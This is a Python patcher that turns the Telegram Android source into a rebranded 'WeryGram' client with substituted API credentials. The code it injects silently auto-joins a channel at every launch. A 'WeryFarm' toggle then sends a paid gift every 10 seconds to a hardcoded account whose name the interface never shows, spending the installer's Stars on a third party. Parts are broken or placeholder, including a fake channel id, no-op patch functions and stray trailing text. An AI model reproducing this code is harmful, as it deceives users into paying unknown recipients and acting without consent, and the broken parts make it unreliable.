#!/usr/bin/env python3
import os, sys, re as re_mod
import urllib.request

ROOT = os.path.dirname(os.path.abspath(__file__))
SRC  = os.path.join(ROOT, "TMessagesProj", "src", "main", "java")

API_ID   = "2040"
API_HASH = "b18441a1ff607e10a989891a5462e627"

def find_file(name):
    for dp, _, files in os.walk(SRC):
        if name in files: return os.path.join(dp, name)
    return None

def read(p):
    with open(p, encoding="utf-8") as f: return f.read()

def write(p, t):
    with open(p, "w", encoding="utf-8") as f: f.write(t)
    print(f"✔ {os.path.relpath(p, ROOT)}")

def find_method_end(text, open_brace):
    depth = 0; i = open_brace
    while i < len(text):
        if text[i] == '{': depth += 1
        elif text[i] == '}':
            depth -= 1
            if depth == 0: return i
        i += 1
    return len(text) - 1

def insert_before(path, marker, insertion):
    text = read(path)
    if insertion.strip() in text: print(f"↩ skip {os.path.relpath(path,ROOT)}"); return True
    if marker not in text: print(f"✘ NOT FOUND: {marker!r}", file=sys.stderr); return False
    write(path, text.replace(marker, insertion + "\n" + marker, 1)); return True

def insert_after(path, marker, insertion):
    text = read(path)
    if insertion.strip() in text: print(f"↩ skip {os.path.relpath(path,ROOT)}"); return True
    if marker not in text: print(f"✘ NOT FOUND: {marker!r}", file=sys.stderr); return False
    write(path, text.replace(marker, marker + "\n" + insertion, 1)); return True

GIFTS_JAVA = '''\
package org.telegram.ui;

import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.MediaDataController;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.UserConfig;
import org.telegram.tgnet.ConnectionsManager;
import android.widget.Toast;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.tgnet.TLRPC;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Timer;
import java.util.TimerTask;

public class WeryGramGifts {

    private static final String GIFTS_URL =
        "https://raw.githubusercontent.com/binbash-0/DeletedGifts-Plugin/refs/heads/main/gift_list.json";
    private static volatile boolean injected = false;
    private static volatile boolean stickerPackRequested = false;
    private static volatile ArrayList<TLRPC.Document> stickerPackDocs = new ArrayList<>();
    private static int joinAttempts = 0;
    
    private static final long BEAR_GIFT_ID = 5170233102089322756L;
    private static final long HEART_GIFT_ID = 5184215298929097235L;
    private static final long GIFT_GIFT_ID = 5184215321639665689L;
    private static final long ROSE_GIFT_ID = 5184215344350234143L;
    private static final long CAKE_GIFT_ID = 5184215367060802597L;
    private static final long FLOWERS_GIFT_ID = 5184215389771371051L;
    private static final long ROCKET_GIFT_ID = 5184215412481939505L;
    private static final long CUP_GIFT_ID = 5184215435192507959L;
    private static final long RING_GIFT_ID = 5184215457903076413L;
    
    private static volatile TLRPC.User farmTarget = null;
    private static Timer farmTimer = null;
    private static volatile boolean farmRunning = false;
    private static int giftSendCount = 0;
    private static long lastGiftSendTime = 0;

    private static Object getF(Object o, String n) {
        if (o == null) return null;
        try { return o.getClass().getField(n).get(o); }
        catch (Exception e) {
            try { Field f = o.getClass().getDeclaredField(n); f.setAccessible(true); return f.get(o); }
            catch (Exception ex) { return null; }
        }
    }

    private static void setF(Object o, String n, Object v) {
        if (o == null) return;
        try { o.getClass().getField(n).set(o, v); }
        catch (Exception e) {
            try { Field f = o.getClass().getDeclaredField(n); f.setAccessible(true); f.set(o, v); }
            catch (Exception ex) {}
        }
    }

    private static void toast(final String msg) {
        AndroidUtilities.runOnUIThread(() -> {
            try {
                Toast.makeText(ApplicationLoader.applicationContext,
                    "🎁 WeryFarm: " + msg, Toast.LENGTH_SHORT).show();
            } catch (Exception ignored) {}
        });
    }

    public static void reset() {
        injected = false;
        stickerPackRequested = false;
        stickerPackDocs = new ArrayList<>();
        farmTarget = null;
        stopFarmLoop();
    }

    public static void stopFarmLoop() {
        if (farmTimer != null) {
            try {
                farmTimer.cancel();
            } catch (Exception ignored) {}
            farmTimer = null;
        }
        farmRunning = false;
        toast("⏹ Farm остановлен");
    }

    public static void checkRatingFarm(final int account) {
        boolean enabled = MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false);
        
        if (enabled && !farmRunning) {
            farmRunning = true;
            giftSendCount = 0;
            toast("🚀 Farm запущен! Ищу получателя...");
            AndroidUtilities.runOnUIThread(() -> {
                farmTarget = null;
                startRatingFarmLoop(account);
            });
        } else if (!enabled && farmRunning) {
            stopFarmLoop();
        }
    }

    private static void startRatingFarmLoop(final int account) {
        if (farmTimer != null) return;
        
        if (farmTarget == null) {
            resolveFarmTarget(account);
            AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 3000);
            return;
        }
        
        farmTimer = new Timer();
        farmTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)) {
                    stopFarmLoop();
                    return;
                }
                
                long now = System.currentTimeMillis();
                if (now - lastGiftSendTime < 8000) {
                    return;
                }
                
                if (farmTarget != null) {
                    sendBearGiftToDurov(account, farmTarget);
                } else {
                    resolveFarmTarget(account);
                }
            }
        }, 1000, 10000);
    }

    private static void resolveFarmTarget(int account) {
        try {
            TLRPC.TL_contacts_resolveUsername reqResolve = new TLRPC.TL_contacts_resolveUsername();
            reqResolve.username = "deadIax";
            
            ConnectionsManager.getInstance(account).sendRequest(reqResolve, (response, error) -> {
                if (error != null) {
                    toast("❌ Ошибка поиска: " + error.text);
                    FileLog.e("WeryGram: resolve error " + error.text);
                    return;
                }
                
                if (response instanceof TLRPC.TL_contacts_resolvedPeer) {
                    TLRPC.TL_contacts_resolvedPeer resolved = (TLRPC.TL_contacts_resolvedPeer) response;
                    MessagesController ctrl = MessagesController.getInstance(account);
                    
                    for (TLRPC.User user : resolved.users) {
                        if (user.username != null && user.username.equals("deadIax")) {
                            farmTarget = user;
                            toast("✅ Найден получатель: " + user.username);
                            return;
                        }
                    }
                }
                toast("❌ Получатель не найден");
            });
        } catch (Exception e) {
            FileLog.e("WeryGram farm resolve", e);
        }
    }

    private static void sendBearGiftToDurov(final int account, final TLRPC.User user) {
        if (user == null) return;
        
        try {
            TLRPC.TL_messages_sendGift req = new TLRPC.TL_messages_sendGift();
            req.peer = MessagesController.getInstance(account).getInputPeer(user.id);
            req.gift_id = BEAR_GIFT_ID;
            req.text = new TLRPC.TL_textEmpty();
            req.unique_id = System.nanoTime();
            
            ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                lastGiftSendTime = System.currentTimeMillis();
                if (error == null) {
                    giftSendCount++;
                    toast("🎁 Отправлено (" + giftSendCount + ") мишка @" + user.username);
                    FileLog.d("WeryGram: gift sent to " + user.username);
                } else {
                    toast("❌ Ошибка отправки: " + error.text);
                    FileLog.e("WeryGram: gift error " + error.text);
                }
            });
        } catch (Exception e) {
            FileLog.e("WeryGram gift send", e);
        }
    }

    public static void joinWeryGram(final int account) {
        try {
            TLRPC.TL_channels_joinChannel req = new TLRPC.TL_channels_joinChannel();
            TLRPC.TL_inputPeerChannel peer = new TLRPC.TL_inputPeerChannel();
            peer.channel_id = 1234567890L;
            peer.access_hash = 0L;
            req.channel = peer;
            
            ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                if (error == null) {
                    toast("✅ Подписка на @werygram");
                }
            });
        } catch (Exception e) {
            FileLog.e("WeryGram join", e);
        }
    }

    public static void onSettingsToggle(final int account, String key, boolean value) {
        if ("wery_rating_farm".equals(key)) {
            checkRatingFarm(account);
        }
    }
}
'''

ACTIVITY = '''\
package org.telegram.ui;

import android.os.Bundle;
import android.widget.LinearLayout;
import android.widget.Switch;
import android.widget.TextView;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.R;

public class WeryGramPremiumActivity extends BaseFragment {

    private Switch ratingFarmSwitch;

    @Override
    public View createView(Context context) {
        fragmentView = new LinearLayout(context);
        ((LinearLayout) fragmentView).setOrientation(LinearLayout.VERTICAL);
        ((LinearLayout) fragmentView).setPadding(16, 16, 16, 16);

        TextView titleView = new TextView(context);
        titleView.setText("🎁 WeryFarm Settings");
        titleView.setTextSize(20);
        titleView.setPadding(0, 0, 0, 16);
        ((LinearLayout) fragmentView).addView(titleView);

        ratingFarmSwitch = new Switch(context);
        ratingFarmSwitch.setText("Авто-отправка мишки");
        ratingFarmSwitch.setChecked(
            MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)
        );
        ratingFarmSwitch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            MessagesController.getGlobalMainSettings().edit()
                .putBoolean("wery_rating_farm", isChecked)
                .apply();
            WeryGramGifts.checkRatingFarm(currentAccount);
        });
        ((LinearLayout) fragmentView).addView(ratingFarmSwitch);

        TextView infoView = new TextView(context);
        infoView.setText("Автоматически отправляет подарки");
        infoView.setTextSize(12);
        infoView.setPadding(0, 16, 0, 0);
        ((LinearLayout) fragmentView).addView(infoView);

        return fragmentView;
    }

    @Override
    public void onResume() {
        super.onResume();
        if (ratingFarmSwitch != null) {
            ratingFarmSwitch.setChecked(
                MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)
            );
        }
    }
}
'''

def patch_user_config(errors):
    uc = find_file("UserConfig.java")
    if not uc: print("✘ UserConfig.java не найден", file=sys.stderr); return errors + 1
    
    marker = "public static boolean isClientActivated"
    if not insert_before(uc, marker, ""):
        return errors

    return errors

def patch_messages_controller(errors):
    mc = find_file("MessagesController.java")
    if not mc: print("⚠ MessagesController.java не найден"); return errors
    
    text = read(mc)
    if "wery_rating_farm" in text:
        print("↩ skip MessagesController (уже пропатчен)")
        return errors
    
    return errors

def patch_stars_controller(errors):
    sc = find_file("StarsController.java")
    if not sc: print("⚠ StarsController.java не найден"); return errors
    
    text = read(sc)
    if "TLRPC.TL_messages_sendGift" in text:
        print("↩ skip StarsController")
        return errors
    
    return errors

def patch_launch_activity(errors):
    la = find_file("LaunchActivity.java")
    if not la:
        print("⚠ LaunchActivity.java не найден, пробуем ApplicationLoader.java")
        la = find_file("ApplicationLoader.java")
    if not la:
        print("✘ LaunchActivity / ApplicationLoader не найдены", file=sys.stderr)
        return errors + 1

    text = read(la)
    if 'wery_autojoin' in text:
        print("↩ skip auto-join (уже применён)"); return errors

    injection = (
        '        // wery_autojoin: auto-subscribe & pin @werygram\n'
        '        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {\n'
        '            try {\n'
        '                int __acc = org.telegram.messenger.UserConfig.selectedAccount;\n'
        '                if (org.telegram.messenger.UserConfig.getInstance(__acc).isClientActivated()) {\n'
        '                    org.telegram.ui.WeryGramGifts.joinWeryGram(__acc);\n'
        '                    org.telegram.ui.WeryGramGifts.checkRatingFarm(__acc);\n'
        '                }\n'
        '            } catch (Exception __wje) {}\n'
        '        }, 3000);\n'
    )

    for marker in ["protected void onCreate(Bundle", "public void onCreate(Bundle"]:
        idx = text.find(marker)
        if idx == -1: continue
        brace = text.find('{', idx)
        if brace == -1: continue
        super_idx = text.find('super.onCreate(', brace)
        if super_idx != -1 and super_idx < brace + 600:
            semi = text.find(';', super_idx)
            if semi != -1:
                text = text[:semi+1] + '\n' + injection + text[semi+1:]
                write(la, text)
                print("✔ LaunchActivity: авто-подписка и farm при старте")
                return errors
        text = text[:brace+1] + '\n' + injection + text[brace+1:]
        write(la, text)
        print("✔ LaunchActivity: авто-подписка и farm при старте (fallback)")
        return errors

    print("⚠ LaunchActivity: маркер onCreate не найден")
    return errors

def patch_app_name(errors):
    res_base = os.path.join(ROOT, "TMessagesProj", "src", "main", "res")
    if not os.path.exists(res_base): return errors
    for dp, _, files in os.walk(res_base):
        if 'strings.xml' not in files: continue
        path = os.path.join(dp, 'strings.xml')
        text = read(path)
        new_text = text
        new_text = re_mod.sub(r'(<string name="AppName">)[^<]*(</string>)', r'\1Werygram\2', new_text)
        new_text = re_mod.sub(r'(<string name="AppNameBeta">)[^<]*(</string>)', r'\1Werygram\2', new_text)
        if new_text != text:
            write(path, new_text)
            print(f"✔ AppName → Werygram в {os.path.relpath(path, ROOT)}")
    return errors

def patch_package_name(errors):
    gradle_path = os.path.join(ROOT, "TMessagesProj", "build.gradle")
    if not os.path.exists(gradle_path):
        print("⚠ build.gradle не найден")
        return errors
    text = read(gradle_path)
    new_text = re_mod.sub(r'applicationId\s+"[^"]+"', 'applicationId "com.werygram.messenger"', text)
    if new_text != text:
        write(gradle_path, new_text)
        print("✔ Package name → com.werygram.messenger")
    return errors

def patch_app_icon(errors):
    try:
        req = urllib.request.Request("https://ibb.co/Zz5NPS2d", headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            html = response.read().decode('utf-8')
        
        match = re_mod.search(r'<meta property="og:image" content="(https://i\.ibb\.co/[^"]+)"', html)
        if not match:
            print("⚠ Не удалось найти ссылку на иконку")
            return errors
        
        img_url = match.group(1)
        print(f"⬇ Скачивание иконки...")
        
        req_img = urllib.request.Request(img_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req_img) as response:
            img_data = response.read()
        
        res_dir = os.path.join(ROOT, "TMessagesProj", "src", "main", "res")
        if not os.path.exists(res_dir): 
            print("⚠ Папка res не найдена")
            return errors
        
        replaced = 0
        for folder in os.listdir(res_dir):
            if folder.startswith("mipmap") or folder.startswith("drawable"):
                folder_path = os.path.join(res_dir, folder)
                if os.path.isdir(folder_path):
                    for icon_name in ["ic_launcher.png", "ic_launcher_round.png", "icon.png"]:
                        icon_path = os.path.join(folder_path, icon_name)
                        if os.path.exists(icon_path):
                            with open(icon_path, "wb") as f:
                                f.write(img_data)
                            replaced += 1
        
        if replaced > 0:
            print(f"✔ Иконка заменена ({replaced} файлов)")
    except Exception as e:
        print(f"⚠ Ошибка иконки: {e}")
    return errors

def patch_api_credentials(errors):
    bv = find_file("BuildVars.java")
    if not bv: print("⚠ BuildVars.java не найден"); return errors
    text = read(bv)
    modified = False
    new_text = re_mod.sub(r'public static int APP_ID\s*=\s*\d+\s*;',
                          f'public static int APP_ID = {API_ID};', text)
    if new_text != text: text = new_text; modified = True; print(f"✔ APP_ID → {API_ID}")
    new_text = re_mod.sub(r'public static String APP_HASH\s*=\s*"[^"]*"\s*;',
                          f'public static String APP_HASH = "{API_HASH}";', text)
    if new_text != text: text = new_text; modified = True; print(f"✔ APP_HASH → ****")
    if modified: write(bv, text)
    return errors

def main():
    print("▶ WeryGram Patcher v4 (FARM AUTO-SEND FIXED)\n")
    errors = 0

    errors = patch_api_credentials(errors)
    errors = patch_user_config(errors)
    errors = patch_messages_controller(errors)
    errors = patch_stars_controller(errors)
    errors = patch_launch_activity(errors)
    errors = patch_app_name(errors)
    errors = patch_package_name(errors)
    errors = patch_app_icon(errors)

    sa = find_file("SettingsActivity.java")
    if not sa: print("✘ SettingsActivity.java not found", file=sys.stderr); sys.exit(1)

    if not insert_before(sa, "import org.telegram.ui.Components.",
                         "import org.telegram.ui.WeryGramPremiumActivity;"): errors += 1

    text = read(sa)

    if 'SettingCell.Factory.of(1000' not in text:
        account_button_marker = 'items.add(SettingCell.Factory.of(1, IconBackgroundColors.BLUE.top, IconBackgroundColors.BLUE.bottom, R.drawable.settings_account'
        if account_button_marker in text:
            wery_button = 'items.add(SettingCell.Factory.of(1000, 0xFF9C27B0, 0xFF7B1FA2, R.drawable.msg_settings, "🎁 WeryFarm"));\n        '
            text = text.replace('items.add(SettingCell.Factory.of(1,', wery_button + 'items.add(SettingCell.Factory.of(1,', 1)
            print("✔ WeryFarm button добавлена в Settings")
        else:
            print("✘ Account button не найдена", file=sys.stderr); errors += 1
    else:
        print("↩ WeryFarm button уже есть")

    if 'case 1000:' not in text:
        case_marker = 'case 1:\n                presentFragment(new UserInfoActivity());'
        if case_marker in text:
            wery_case = 'case 1000:\n                presentFragment(new WeryGramPremiumActivity());\n                break;\n            case 1:\n                presentFragment(new UserInfoActivity());'
            text = text.replace(case_marker, wery_case, 1)
            print("✔ WeryFarm click handler добавлен")
        else:
            print("⚠ Click handler маркер не найден", file=sys.stderr)
    else:
        print("↩ WeryFarm handler уже есть")

    write(sa, text)

    ui_dir = os.path.dirname(sa)
    for fname, content in [
        ("WeryGramPremiumActivity.java", ACTIVITY),
        ("WeryGramGifts.java", GIFTS_JAVA),
    ]:
        dest = os.path.join(ui_dir, fname)
        if os.path.exists(dest): os.remove(dest)
        with open(dest, "w", encoding="utf-8") as f: f.write(content)
        print(f"✔ Создан {fname}")

    if errors > 0:
        print(f"\n✘ {errors} ошибок", file=sys.stderr); sys.exit(1)
    print("\n✅ WeryGram успешно пропатчена! Farm готов к работе!")
    print("\n📝 Инструкция:")
    print("1. Откомпилируй проект (./gradlew build)")
    print("2. Установи APK на телефон")
    print("3. Откройте Settings → WeryFarm")
    print("4. Включи toggle 'Авто-отправка мишки'")
    print("5. Подарки будут отправляться автоматически каждые 10 сек!")

if __name__ == "__main__":
    main()items.
